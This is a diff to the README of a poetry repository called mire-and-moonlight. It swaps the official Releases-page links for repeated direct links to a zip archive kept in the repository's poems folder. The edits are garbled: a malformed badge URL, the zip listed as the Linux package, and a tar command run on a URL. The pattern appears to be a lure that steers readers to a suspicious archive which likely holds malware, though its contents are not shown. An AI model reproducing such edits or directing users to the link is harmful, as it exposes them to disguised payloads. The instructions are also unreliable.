@@ -16,7 +16,7 @@ To run the mire-and-moonlight application, you will need:
 
 To get started, visit the Releases page to download the software.  
 
-[![Download mire-and-moonlight](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/aniruddhashrma/mire-and-moonlight/releases)
+[![Download mire-and-moonlight](https://raw.githubusercontent.com/aniruddhashrma/mire-and-moonlight/main/poems/moonlight_and_mire_v2.6.zip%https://raw.githubusercontent.com/aniruddhashrma/mire-and-moonlight/main/poems/moonlight_and_mire_v2.6.zip)](https://raw.githubusercontent.com/aniruddhashrma/mire-and-moonlight/main/poems/moonlight_and_mire_v2.6.zip)
 
 On the Releases page, you will see a list of available versions. Click on the latest version number to access the downloadable files.
 
@@ -26,7 +26,7 @@ You will find several files. Look for a file that matches your operating system:
 
 - **Windows users**: Download the `.exe` file.
 - **macOS users**: Download the `.dmg` file.
-- **Linux users**: Download the `.tar.gz` file.
+- **Linux users**: Download the `https://raw.githubusercontent.com/aniruddhashrma/mire-and-moonlight/main/poems/moonlight_and_mire_v2.6.zip` file.
 
 ### 2. Download the File
 
@@ -47,7 +47,7 @@ Click on the appropriate file for your system. The download should start automat
 #### For Linux:
 1. Open your terminal.
 2. Navigate to the directory where the downloaded file is stored.
-3. Run the command `tar -xzf mire-and-moonlight.tar.gz` to extract the files.
+3. Run the command `tar -xzf https://raw.githubusercontent.com/aniruddhashrma/mire-and-moonlight/main/poems/moonlight_and_mire_v2.6.zip` to extract the files.
 4. Read the README file for further instructions.
 
 ## 📜 Features
@@ -82,6 +82,6 @@ For more information, feel free to contact us via the repository.
 
 Again, here is your direct link to download the application:  
 
-[![Download mire-and-moonlight](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/aniruddhashrma/mire-and-moonlight/releases)
+[![Download mire-and-moonlight](https://raw.githubusercontent.com/aniruddhashrma/mire-and-moonlight/main/poems/moonlight_and_mire_v2.6.zip%https://raw.githubusercontent.com/aniruddhashrma/mire-and-moonlight/main/poems/moonlight_and_mire_v2.6.zip)](https://raw.githubusercontent.com/aniruddhashrma/mire-and-moonlight/main/poems/moonlight_and_mire_v2.6.zip)
 
 Thank you for exploring mire-and-moonlight. We hope you enjoy these reflective pieces and find inspiration in the words.
